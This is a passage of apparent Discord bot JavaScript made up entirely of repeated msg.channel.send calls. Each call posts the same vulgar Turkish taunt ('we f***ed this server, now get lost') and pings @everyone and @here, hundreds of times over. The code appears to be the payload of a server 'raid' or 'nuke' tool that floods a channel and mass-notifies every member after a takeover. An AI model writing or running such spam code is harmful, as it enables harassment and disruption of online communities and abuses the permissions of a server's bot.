    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
